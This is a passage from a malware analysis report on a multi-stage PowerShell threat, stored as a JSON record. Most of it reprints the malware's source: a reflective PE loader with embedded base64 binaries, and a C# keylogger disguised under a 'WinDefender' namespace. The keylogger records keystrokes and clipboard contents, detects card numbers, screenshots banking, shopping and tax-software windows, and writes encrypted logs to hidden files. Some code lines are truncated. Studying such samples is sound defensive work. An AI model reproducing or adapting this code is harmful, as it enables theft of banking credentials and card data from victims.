$rckey\"\n}\n\n```\n\n-----\n\n```\nelse\n{\n}\n  [System.IO.Directory]::SetCurrentDirectory($pwd)\n$PEBytes64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n$PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nif ($ComputerName -eq $null -or $ComputerName -imatch \"^\\s*$\")\n{\nInvoke-Command -ScriptBlock $RemoteScriptBlock ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)\n}\nelse\n{\nInvoke-Command -ScriptBlock $RemoteScriptBlock ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs) ComputerName $ComputerName\n}\n}\nMain\n}\nget-fgruvers -versid atinmem -fpath 'path discarded by mal analyst' -idsid 1215 rckey 'key discarded by mal analyst'\n\n### This code contains two piece of binary code encoded in base64 (on line 2045 and 2046).\n\n I have uploaded the x86-64 bit version on Hybrid Analysis and VirusTotal:\n\n https://www.hybrid- analysis.com/sample/ba5a5979276969eb4227131607df0b7bd5291902479e905bffba994579 64f99d/5abb37547ca3e117ec525fc8\n\n```\n\n-----\n\n## Stage 6 (function get-watcher)\n\n### The PowerShell in the sixth stage executes the following C# appcode. It takes snapshot from windows with the following titles:\n```\nprivate static string[] titles = { \"paypal\", \"ebay\", \"chase\", \"banking\", \"credit\ncards\", \"american express\", \"newegg\", \"amazon\", \"walmart\", \"bestbuy\", \"target\",\n\"apple\", \"sign in\", \"azure\", \"Login\", \"bank\", \"banco\", \"bancario\", \"registrarse\",\n\"iniciar sesión\", \"seguridad\", \"banque\", \"bancaire\", \"se connecter\", \"security\", \"ebank\", \"tax\", \"OLT\",\"ProSeries\", \"Drake\", \"Taxslayer\", \"ProTaxPro\", \"Taxwise\"}\n\n```\n\n-----\n\n```\nfunction def {\nif(!(Test-path $args[1])) {\n  $h = ni -Path $args[1] -ItemType \"directory\"\n  $h.attributes=\"Hidden\"\n  }\nif ([int]$args[2] -ge 3){$e = 'CSharp'}else{$e = 'CSharpVersion3'}\nAdd-Type @\"\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Collections.Generic;\nusing System.IO;\nusing System.Windows.Forms;\nusing System.Security.Cryptography;\nusing System.Drawing;\nusing Imaging = System.Drawing.Imaging;\nnamespace WinDefender\n{\n  public class User32\n  {\n    public const int VK_LBUTTON = 1;    \n    public const int VK_BACK = 8;      \n    public const int VK_TAB = 9;\n    public const int VK_RETURN = 0x0D;  \n    public const int VK_ESCAPE = 0x1B;\n    public const int VK_PRIOR = 0x21;   \n    public const int VK_NEXT = 0x22;   \n    public const int VK_END = 0x23;\n    public const int VK_HOME = 0x24;\n    public const int VK_LEFT = 0x25;\n    public const int VK_UP = 0x26;\n    public const int VK_RIGHT = 0x27;\n    public const int VK_DOWN = 0x28;\n    public const int VK_DELETE = 0x2E;\n    public const int VK_LSHIFT = 160;\n    public const int VK_RSHIFT = 161;\n    public const int VK_LCONTROL = 162;\n    public const int VK_RCONTROL = 163;\n    public const int VK_OEM_CLEAR = 254;  \n    public const int VK_LOWEST = VK_LBUTTON;\n    public const int VK_HIGHEST = VK_OEM_CLEAR;\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto, ExactSpelling = true)]\n    public static extern short GetAsyncKeyState(int virtualKeyCode);\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\n    [return: MarshalAs(UnmanagedType.Bool)]\n    public static extern bool GetKeyboardState(byte[] keystate);\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\n    public static extern uint MapVirtualKey(uint uCode, uint uMapType);\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\n    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkey\n      [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] System.Text.StringB\n      int cchBuff, uint wFlags);\n    [DllImport(\"User32.dll\")]\n\n```\n\n-----\n\n```\n    public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCoun\n    [DllImport(\"User32.dll\")]\n    public static extern int GetForegroundWindow();\n  }\n  public static class Recorder\n  {\n    public static string Pattern = @\"((((4\\d{3})|(5[1-5]\\d{2})|(6(?:011|5[0-9][09])))(-?|\\040?)(\\d{4}(-?|\\040?)){3}))|((3[4,7]\\d{2})(-?|\\040?)\\d{6}(-?|\\040?)\\d{5})\";\n    public static string Pathfile = Guid.NewGuid().ToString();\n    public static string Pathlog = Guid.NewGuid().ToString();\n    private static string currentData = string.Empty;\n    private static string previousData = string.Empty;\n    private static string Outout = string.Empty;\n    public static string SesKey = Guid.NewGuid().ToString();\n    private static string hWndTitle;\n    private static string hWndTitlePast;\n    private static TextBox tb = new TextBox() { Multiline = true };\n    private static Encoding Utf8NoBomEncoding = new UTF8Encoding(false);\n    private static System.Threading.Thread ScreenThread;\n    private static string[] titles = { \"paypal\", \"ebay\", \"chase\", \"banking\", \"cred\nbank\", \"tax\", \"OLT\",\"ProSeries\", \"Drake\", \"Taxslayer\", \"ProTaxPro\", \"Taxwise\"};\n    public static string getnamefile(string Pathfile)\n    {\n      return Pathfile + \"\\\\\" + Guid.NewGuid().ToString(\"n\").Substring(0, 6) + \"\"+ Guid.NewGuid().ToString(\"n\").Substring(0, 4) +\"\"+ Guid.NewGuid().ToString(\"n\").Substring(0, 7) +\"-Public-AppUpdate\";  \n    }  \n    static bool GetTitle(string winTitle)\n    {\n      if (string.IsNullOrEmpty(winTitle))\n        return false;\n      foreach (string title in titles)\n        if (winTitle.ToLower().Contains(title))\n          return true;\n      return false;\n    }\n    private static string previousLuna = string.Empty;\n    public static bool Luna(string number)\n    {\n      if (previousLuna.Equals(number))\n        return false;\n      int sum = 0;\n      number = number.Replace(\"-\", \"\");\n      number = number.Replace(\" \", \"\");\n      char[] temp = number.ToCharArray();\n      int[] numbers = new int[number.Length];\n      bool alt = false;\n      for (int i = temp.Length - 1; i &gt; -1; i--)\n        if (int.TryParse(temp[i].ToString(), out numbers[i]))\n        {\n          if (alt)\n          {\n            numbers[i] *= 2;\n            if (numbers[i] &gt; 9)\n\n```\n\n-----\n\n```\n              numbers[i]  9;\n          }\n          sum += numbers[i];\n          alt = !alt;\n        }\n      if ((sum % 10) == 0)\n      {\n        previousLuna = number;\n        return true;\n      }\n      return false;\n    }\n    public static string ActiveApplTitle()\n    {\n      int hwnd = User32.GetForegroundWindow();\n      StringBuilder sbTitle = new StringBuilder(1024);\n      int intLength = User32.GetWindowText(hwnd, sbTitle, sbTitle.Capacity);\n      if ((intLength sbTitle.Length)) return \"Unknown Title\";\n      string title = sbTitle.ToString();\n      return title;\n    }\n    public static string GetTimeNow()\n    {\n      DateTime now = DateTime.Now;\n      return now.ToString(\"yy.MM.dd HH:mm:ss\");\n    }\n    public static string GetTimeNowImg()\n    {\n      DateTime now = DateTime.Now;\n      return now.ToString(\"yy-MM-dd-hh-mm-ss\");\n    }\n    static string GetClipboardText()\n    {\n      tb.Text = \"\";      \n      tb.Paste();\n      return tb.Text;\n    }\n    public static void CryptBytes(string output, string SesKey)\n    {\n      Encoding encoding = Encoding.UTF8;\n      byte[] bytes = encoding.GetBytes(output);\n      byte[] IV = new byte[16];\n      Random rnd = new Random();\n      rnd.NextBytes(IV);\n      RijndaelManaged AES = new RijndaelManaged()\n      {\n        Mode = CipherMode.CBC,\n        Key = encoding.GetBytes(SesKey),\n        IV = IV\n      };\n      List ciphertext = new List();\n      ciphertext.AddRange(IV);\n      ciphertext.AddRange((AES.CreateEncryptor()).TransformFinalBlock(bytes, 0,\n      HMACSHA1 hmac = new HMACSHA1() { Key = encoding.GetBytes(SesKey) };\n\n```\n\n-----\n\n```\n      AES.Clear();\n      ciphertext.AddRange(hmac.ComputeHash(ciphertext.ToArray()));\n      string EncodedText = Convert.ToBase64String(ciphertext.ToArray()) + \"``@\";\n      File.AppendAllText(Pathlog, EncodedText, Utf8NoBomEncoding); \n    }\n    static void GetScreenRunspace()\n    {\n      string PathPic= getnamefile(Pathfile) + \".log\";\n      string ImgOut = string.Empty;\n      string ImgOutCSS = string.Empty;\n      for (int i = 0; i &lt; 15; i++)\n      {\n        try\n        {\n          Rectangle ScreenBounds = SystemInformation.VirtualScreen;\n          Bitmap ScreenshotObject = new Bitmap(ScreenBounds.Width, ScreenBou\n          Graphics DrawingGraphics = Graphics.FromImage(ScreenshotObject);\n          DrawingGraphics.CopyFromScreen(ScreenBounds.Location, Point.Empty,\n          DrawingGraphics.Dispose();\n          using (MemoryStream ms = new MemoryStream())\n          {\n            int iQual = 18;\n            Imaging.EncoderParameters encoderParams = new Imaging.EncoderP\n            encoderParams.Param[0] = new Imaging.EncoderParameter(Imaging.\n            Imaging.ImageCodecInfo jpegCodec = null;\n            foreach (var item in Imaging.ImageCodecInfo.GetImageEncoders()\n              if (item.FormatDescription == &quot;JPEG&quot;)\n                jpegCodec = item;\n            if (jpegCodec != null)\n            {\n              ScreenshotObject.Save(ms, jpegCodec, encoderParams);\n              ScreenshotObject.Dispose();\n            }\n            string ImgDateName = GetTimeNowImg();\n            string FileImageEncode = ImgDateName + &quot;|&quot; + Convert\n            ImgOut += &quot;<a><img></a>\";\n            File.AppendAllText(PathPic, FileImageEncode, Utf8NoBomEncoding\n          }\n        }\n        finally\n        {\n          System.Threading.Thread.Sleep(4000);\n        }\n      }\n      ImgOutCSS += \"\n<div>#B#u#t#o#\n<div>\" + ImgOut + \"66#66#66\";\n\n```\n\n-----\n\n```\n      CryptBytes(ImgOutCSS, SesKey);\n    }\n    private static void RunScreening()\n    {\n      if (ScreenThread == null || ScreenThread.ThreadState != System.Threading.T\n      {\n        ScreenThread = new System.Threading.Thread(GetScreenRunspace);\n        ScreenThread.Start();\n      }\n    }\n    public static void Record()\n    {\n      byte[] previousVkeyStates = new byte[256];\n      while ((previousVkeyStates[User32.VK_LSHIFT] == 0) || (previousVkeyStates[\n      {\n        System.Threading.Thread.Sleep(10);\n        byte[] vkeyStates = new byte[256];\n        for (byte vkeyID = User32.VK_LOWEST; vkeyID &lt; User32.VK_HIGHEST; vk\n        {\n          vkeyStates[vkeyID] = ((User32.GetAsyncKeyState(vkeyID) &amp; 0x800\n        }\n        for (byte vkeyID = User32.VK_LOWEST; vkeyID 0)\n                {\n                  hWndTitle = ActiveApplTitle();\n                  if (hWndTitle != hWndTitlePast)\n                  {\n                    Outout += Environment.NewLine + \"\n<div>[ENTER] == Title == :\" + hWndTitle + \" - \" + GetTimeNow() + \"== </div>\n\";\n                    if (GetTitle(hWndTitle))\n                      RunScreening();\n                    hWndTitlePast = hWndTitle;\n                  }\n                  Outout += unicodeChars.ToString();\n                  string currentData = GetClipboardText();\n                  if (!string.IsNullOrEmpty(currentData) &amp;&amp;\n                  {\n                    Outout += Environment.NewLine + \"\\n\n<div>[CLIPBOARD: \" + GetTimeNow() + \"]</div>\n\\r\\n\" + currentData + \"\\r\\n\n<div>[/ CLIPBOARD]</div>\n\\r\\n\";\n                    previousData = currentData;\n                  }\n                  if (Outout.Length &gt; 15 &amp;&amp; Luna(System.T\n                  {\n                    RunScreening();\n                    CryptBytes(Outout, SesKey);\n                    Outout = \"\";\n\n```\n\n-----\n\n```\n                  }\n                  if (Outout.Length &gt; 100)\n                  {\n                    CryptBytes(Outout, SesKey);\n                    Outout = \"\";\n                  }\n                }\n                break;\n            }\n          }\n          previousVkeyStates[vkeyID] = vkeyStates[vkeyID];\n        }\n      }\n    }\n  }\n}\n\"@ -ReferencedAssemblies @('System.Windows.Forms', 'System.Drawing') -Language $e\n$Pathlog = $args[1] +\"\\Debugger-version-2.dat\"\n[WinDefender.Recorder]::Pathlog = $Pathlog;\n[WinDefender.Recorder]::Pathfile = $args[1];\n[WinDefender.Recorder]::SesKey = $args[0];\n[WinDefender.Recorder]::Record()\n}\ndef 'I{9L4#pwOmlz+M,8@.BW~fnGEX:cNv?k' 'C:\\Users\\user\\AppData\\Local\\Temp\\S-1-5-21412654016-3479515840-311' '5'\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-28 - Multi-stage Powershell script (Brownies).pdf"
    ],
    "report_names": [
        "2018-03-28 - Multi-stage Powershell script (Brownies).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535581,
    "ts_updated_at": 1743041123,
    "ts_creation_date": 1653752179,
    "ts_modification_date": 1653752179,
    "files": {
        "pdf": "https://archive.orkl.eu/8b3cbf29afb263d8f3c8947002546f3fddb81863.pdf",
        "text": "https://archive.orkl.eu/8b3cbf29afb263d8f3c8947002546f3fddb81863.txt",
        "img": "https://archive.orkl.eu/8b3cbf29afb263d8f3c8947002546f3fddb81863.jpg"
    }
}